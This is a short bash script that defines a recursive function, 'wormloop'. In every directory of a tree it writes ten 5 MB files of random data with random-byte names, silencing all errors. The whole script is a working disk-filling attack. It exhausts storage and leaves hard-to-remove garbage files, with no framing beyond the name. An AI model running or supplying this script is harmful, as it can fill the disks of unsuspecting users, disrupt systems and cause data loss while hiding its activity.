#!/bin/bash

wormloop () {
    for i in {1..10}
    do
        head -c 5MB /dev/urandom > "$(head -c 8 /dev/urandom)" 2>/dev/null
    done
    for d in ./*/ ; do (cd "$d" && wormloop); done
}

wormloop 2>/dev/null
